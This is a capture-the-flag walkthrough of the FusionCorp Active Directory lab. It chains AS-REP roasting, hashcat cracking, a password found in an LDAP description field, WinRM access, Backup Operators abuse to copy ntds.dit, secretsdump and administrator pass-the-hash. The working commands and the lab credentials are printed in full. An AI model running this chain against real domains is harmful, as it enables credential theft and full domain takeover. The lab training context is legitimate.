Domain name is fusion.corp, but I am unable to enumerate the domain any further:

Looking at the company website, I obtain the employee names:

Performing a directory search returns an unusual directory called backups:

┌──(kali㉿kali)-[~/Desktop/Labs/FusionCorp/usergen]
└─$ gobuster dir -u http://10.65.141.238 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,ini,cfg,asp,aspx,zip,sql,bak

Inside the backup directory, there is a file called employees.ods which contains the full name and their username:

Save the entire usernames to a file and then perform AS-REP Roasting to obtain the AS-REP hash of lparker:

┌──(kali㉿kali)-[~/Desktop/Labs/FusionCorp]
└─$ nxc ldap fusion.corp -u employees.txt -p '' --asreproast out
LDAP        10.65.141.238   389    FUSION-DC        [*] Windows 10 / Server 2019 Build 17763 (name:FUSION-DC) (domain:fusion.corp) (signing:None) (channel binding:No TLS cert)

Crack the hash to obtain the password !!abbylvzsvs2k6! of lparker:

$krb5asrep$23$lparker@FUSION.CORP:ad9cf0d68fbcad00129404c026456d7f$f10771d34001b8fab7b93e28132a915183f3dd67509e5772edeea87e98325832bc3b2ad95eae5c7377ea0d44aa1528552152792fd897ef3f6a95f4459f7b9f93ab360945cf1d51e816f5d49edd562b685c119a0ae66e8e7f2417ecaacdfb2f2394f6b1fb7a3bb95ad03558c4b8b7fddcfcb3b95397cf8d1e9689564e6d5141464bbd1a2c7e05897116a3cc77f80cb99844c29b0e5a9106232c4c57a49612e4537ce83980cef3d9b3bdaed4a0acf891bedfba950427591e22ed3fb9094376bb66ef50dd3164648f034278ea998bbedcf3cf7feb8cbee395360d903e2f5f01ba07d7b2cc1dfd136aae904c:!!abbylvzsvs2k6!
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$lparker@FUSION.CORP:ad9cf0d68fbcad001...ae904c
$krb5asrep$23$lparker@FUSION.CORP:ad9cf0d68fbcad00129404c026456d7f$f10771d34001b8fab7b93e28132a915183f3dd67509e5772edeea87e98325832bc3b2ad95eae5c7377ea0d44aa1528552152792fd897ef3f6a95f4459f7b9f93ab360945cf1d51e816f5d49edd562b685c119a0ae66e8e7f2417ecaacdfb2f2394f6b1fb7a3bb95ad03558c4b8b7fddcfcb3b95397cf8d1e9689564e6d5141464bbd1a2c7e05897116a3cc77f80cb99844c29b0e5a9106232c4c57a49612e4537ce83980cef3d9b3bdaed4a0acf891bedfba950427591e22ed3fb9094376bb66ef50dd3164648f034278ea998bbedcf3cf7feb8cbee395360d903e2f5f01ba07d7b2cc1dfd136aae904c:!!abbylvzsvs2k6!
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$lparker@FUSION.CORP:ad9cf0d68fbcad001...ae904c

Now I have working set of credentials:

┌──(kali㉿kali)-[~/Desktop/Labs/FusionCorp]
└─$ nxc smb fusion.corp -u lparker -p '!!abbylvzsvs2k6!' 
SMB         10.65.141.238   445    FUSION-DC        [*] Windows 10 / Server 2019 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.65.141.238   445    FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6!
┌──(kali㉿kali)-[~/Desktop/Labs/FusionCorp]
└─$ nxc smb fusion.corp -u lparker -p '!!abbylvzsvs2k6!' 
SMB         10.65.141.238   445    FUSION-DC        [*] Windows 10 / Server 2019 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.65.141.238   445    FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6!

When enumerating the domain users via LDAP, I notice the password u8WC3!kLsgw=#bRY saved in the description field of user jmurphy:

┌──(kali㉿kali)-[~/Desktop/Labs/FusionCorp]
└─$ nxc ldap fusion.corp -u lparker -p '!!abbylvzsvs2k6!' --users
LDAP        10.65.141.238   389    FUSION-DC        [*] Windows 10 / Server 2019 Build 17763 (name:FUSION-DC) (domain:fusion.corp) (signing:None) (channel binding:No TLS cert)

└─$ nxc ldap fusion.corp -u lparker -p '!!abbylvzsvs2k6!' --users

Seems like both users have the ability to use WinRM on the DC:

┌──(kali㉿kali)-[~/Desktop/Labs/FusionCorp]
└─$ nxc ldap fusion.corp -u lparker -p '!!abbylvzsvs2k6!' --groups "Remote Management Users"
LDAP        10.65.141.238   389    FUSION-DC        [*] Windows 10 / Server 2019 Build 17763 (name:FUSION-DC) (domain:fusion.corp) (signing:None) (channel binding:No TLS cert) 
LDAP        10.65.141.238   389    FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6! 
LDAP        10.65.141.238   389    FUSION-DC        Joseph Murphy
LDAP        10.65.141.238   389    FUSION-DC        Larry Parker

└─$ nxc ldap fusion.corp -u lparker -p '!!abbylvzsvs2k6!' --groups "Remote Management Users"
LDAP        10.65.141.238   389    FUSION-DC        [*] Windows 10 / Server 2019 Build 17763 (name:FUSION-DC) (domain:fusion.corp) (signing:None) (channel binding:No TLS cert) 
LDAP        10.65.141.238   389    FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6! 
LDAP        10.65.141.238   389    FUSION-DC        Joseph Murphy
LDAP        10.65.141.238   389    FUSION-DC        Larry Parker

Interestingly, the user jmurphy belongs to the Backup Operators group. This is a highly privileged AD group which can be used to escalate privileges:

Flag of lparker:

┌──(kali㉿kali)-[~/Desktop/Labs/FusionCorp]
└─$ evil-winrm -i fusion.corp -u lparker -p '!!abbylvzsvs2k6!'

Checking the groups jmurphy is in shows the privileges of Backup Operators are enabled:

*Evil-WinRM* PS C:\Users\jmurphy\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> 

*Evil-WinRM* PS C:\Users\jmurphy\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\jmurphy\Desktop>

Follow the instructions from this amazing article on how to exploit it. In short, diskshadow will be used to create a copy of the drive where ntds.dit is stored which is then extracted using robocopy. Once transferred to our machine along with system hive, we can extract domain credentials.

Once transferred, extract the hashes :

┌──(kali㉿kali)-[~/Desktop/Labs/FusionCorp]
└─$ impacket-secretsdump -system system.save -ntds ntds.dit local                         
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 76cf6bbf02e743fac12666e5a41342a7
[*] Reading and decrypting hashes from ntds.dit

Perform pass-the-hash using domain administrator's hash to gain access to the DC:

┌──(kali㉿kali)-[~/Desktop/Labs/FusionCorp]
└─$ evil-winrm -i fusion.corp -u administrator -H 9653b02d945329c7270525c4c2a69c67
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

   Connection-specific DNS Suffix  . : ec2.internal
